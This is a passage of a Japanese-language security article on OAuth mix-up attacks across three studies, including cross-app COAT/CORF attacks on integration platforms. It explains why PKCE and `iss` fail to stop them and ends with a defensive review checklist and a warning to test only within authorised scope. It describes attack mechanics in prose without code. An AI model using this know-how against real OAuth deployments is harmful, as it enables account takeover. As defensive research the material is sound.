**PKCE は防御にならない**と論文は明言する（分析対象のうち3プラットフォームが PKCE をサポートしていたが、いずれも防げなかった）。COAT では攻撃者が自分のフローで生成した code_challenge を被害者に使わせる（前節の PKCE Chosen Challenge 攻撃そのもの）。CORF では逆に、攻撃者が被害者の code_challenge を使って自分の code を取得し、被害者のフローに注入し返す。PKCE が保証するのは「チャレンジと verifier の組が一致すること」だけで、「このフローがどのアプリの、誰のものか」ではないからである。

**`iss`（RFC 9207）との関係**: 標準の `iss` は AS ごとの静的な識別子で、理想的には標準準拠のプラットフォームとアプリを守る。しかし統合プラットフォームでは**複数アプリが同じ issuer を共有しうる**（一意でなくなる）うえ、CORF はスコープ外であり、手動登録・独自のトークン要求ロジック・インプリシットグラントなど標準非準拠の実装も多い。このため論文は「per-AS ID（issuer）は分離境界としてずれている」とし、プラットフォームが払い出す per-app ID を推奨している。講演の後半では、Security BCP（RFC 9700 の 4.4 節）に統合プラットフォーム向けの具体的な mix-up 防御を加える提案が議論された。

> 出典: Kaixuan Luo ほか「Cross-app OAuth Attacks in Integration Platforms: Mix-up Attacks Reloaded」（OAuth Security Workshop 2025, 2025-02-27） — https://talks.secworkshop.events/osw2025/talk/WG9TEW/
> 補足出典（講演の元論文）: Kaixuan Luo ほか「Universal Cross-app Attacks: Exploiting and Securing OAuth 2.0 in Integration Platforms」（USENIX Security 2025） — https://www.usenix.org/system/files/usenixsecurity25-luo-kaixuan.pdf

---

### 4. まとめ: 3資料を貫く一つの原理

3つの資料は、10年近くにわたって同じ一つの問題を追っている。

| | 2016 形式解析 | 2020 Revisited | 2025 Cross-app |
|---|---|---|---|
| クライアント | 複数 IdP 対応の RP | メタデータで issuer を解決するクライアント | 統合プラットフォーム |
| 悪意ある AS の入り方 | 動的登録・侵害（非現実的とされた） | 攻撃者が自由に書けるメタデータ | マーケットプレイスへのアプリ登録（容易） |
| 取り違えの鍵 | 明示的追跡 + 共通 redirect_uri | issuer と AS の対応が攻撃者次第 | state/redirect_uri の片方だけで識別 |
| PKCE | （当時は前提外） | Chosen Challenge で回避される | COAT/CORF とも回避される |
| 防御 | 認可レスポンスに IdP 識別子（→ `iss`） | `iss` または per-Issuer redirect_uri、PAR 限定、送信者制約 | state と redirect_uri の per-app ID 照合 |

共通する原理は次の一文に尽きる: **クライアントは「code/トークンを発行したのは誰か」を、攻撃者が操作できない情報で確認し、それを「自分が始めたフローの相手」と突き合わせなければならない**。redirect_uri の厳密一致、state、PKCE、TLS はいずれも別の問題（漏洩・CSRF・横取り・盗聴）を解くもので、この問いには答えない。

実装レビュー（防御側）で確認すべき点を整理しておく。

- 複数の AS/IdP/アプリを扱うクライアントか。扱うなら、コールバックで**発行元の同一性**を検査しているか。
- RFC 9207 対応の AS なら `iss` を受け取り、フロー開始時に保存した issuer と**完全一致**比較しているか。AS が `authorization_response_iss_parameter_supported` を宣言しているのに `iss` が欠けていたら拒否しているか。
- `iss` を使わない場合、redirect_uri は **AS 単位ではなく issuer 単位**（統合プラットフォームならアプリ単位）で分かれており、かつセッションの期待値と照合しているか。
- メタデータを動的に取り込む場合、issuer とエンドポイントの対応が攻撃者に書き換えられうることを前提に設計しているか。
- PAR 対応 AS では PAR 専用化（RFC 9126 の `require_pushed_authorization_requests`）を検討したか。アクセストークンは送信者制約付きか。
- IdP 側: 資格情報 POST への応答で 307 を使っていないか（303 を使う）。コールバック後のページで Referer に code/state が漏れないか。

これらの検証は、必ず自分の管理する環境、または明示的に許可されたプログラムのスコープ内で行うこと。mix-up 系の検証は「悪意ある AS/アプリ」を立てる必要があり、実在サービスのマーケットプレイスに実際に登録して試すことは、たとえ研究目的でも許可なく行ってはならない。
